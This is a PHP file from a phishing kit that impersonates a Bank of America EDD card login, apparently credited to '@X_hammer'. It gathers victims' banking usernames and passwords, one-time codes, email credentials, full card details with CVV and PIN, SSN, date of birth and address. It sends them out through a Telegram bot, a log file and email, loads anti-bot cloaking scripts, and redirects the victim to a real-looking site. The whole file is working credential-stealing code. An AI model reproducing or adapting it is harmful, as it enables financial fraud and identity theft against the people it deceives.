<?php

session_start();
date_default_timezone_set('GMT'); 
error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');

include('../Antibot/blockers.php');
include('../Antibot/detects.php');

include('../config.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');
$TIME_DATE = date('H:i:s d/m/Y');


$_SESSION['otp'] = $_POST['otp'];

if (isset($_POST['otp'])) {
	$Z118_MESSAGE .= "
	
	[ BOA EDD ACCOUNT LOGIN]
	[ USER LOGIN INFORMATION]

	+++++++++++++++++++++[ CIROC ] ++++++++++++++++++++++

	[Username] = ".$_SESSION['first_userids']."
	[Password] = ".$_SESSION['_my_password_']."

	++++++++++++++++++++++++++++++++++++++++++++++++++++
	
	[OTP] = ".$_POST['otp']."

	++++++++++++++++++++++++++++++++++++++++++++++++++++

	[Email address] = ".$_SESSION['email_address']."
	[Password] = ".$_SESSION['email_password']."

	++++++++++++++++++++++++++++++++++++++++++++++++++++

	[Card Name] =".$_SESSION['_cardname_']."
	[Card Number] = ".$_SESSION['_cardnumber_']."
	[Cvv]	= ".$_SESSION['_csc_']."
	[Expiration Date] = ".$_SESSION['_expdate_']."
	[Card Pin]     = ".$_SESSION['_card_pin_']."

	++++++++++++++++++++++++++++++++++++++++++++++++++++

	[SSN]  = ".$_SESSION['_ssn_']."
	[Date of Birth] = ".$_SESSION['_dob_']."
	[Address line] = ".$_SESSION['_address_']."
	[Town/City] = ".$_SESSION['_city_']."
	[Province/State] = ".$_SESSION['_state_']."
	[Postal/Zip Code] = ".$_SESSION['_zipCode_']."
	[Phone Number] =  ".$_SESSION['_phone_']."

	++++++++++++++++++++++++++++++++++++++++++++++++++++
	[VICTIM INFORMATION]
	
	[TIME/DATE]    = ".$TIME_DATE."
	[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
	[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
	[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
	[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."
	
	##################[ BY @X_hammer ]#####################
	\n";
	
	if($send_results_to_telegram == "on") {
		$data = [
			'text' => ''.$Z118_MESSAGE.'',
			'chat_id' => ''.$chat_id.''
		];
		file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	}
	
	if($save_results_to_cpanel == "on") {
		$res_file = fopen("../logs/OTP.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
	}
	
	if($send_results_to_email == "on") {
	
		$Z118_SUBJECT = "✪ OTP FROM : ✪ ".$_POST['otp']." ✪";
		$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
		$Z118_HEADERS .= $_POST['otp']."\n";
		$Z118_HEADERS .= "MIME-Version: 1.0\n";
		$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	}
	
	if($redirect_to_next_page == "on") {
		Header("Location: https://www.visaprepaidprocessing.com/eddcard/Verify/SignIn");
	}

} 


	
?>
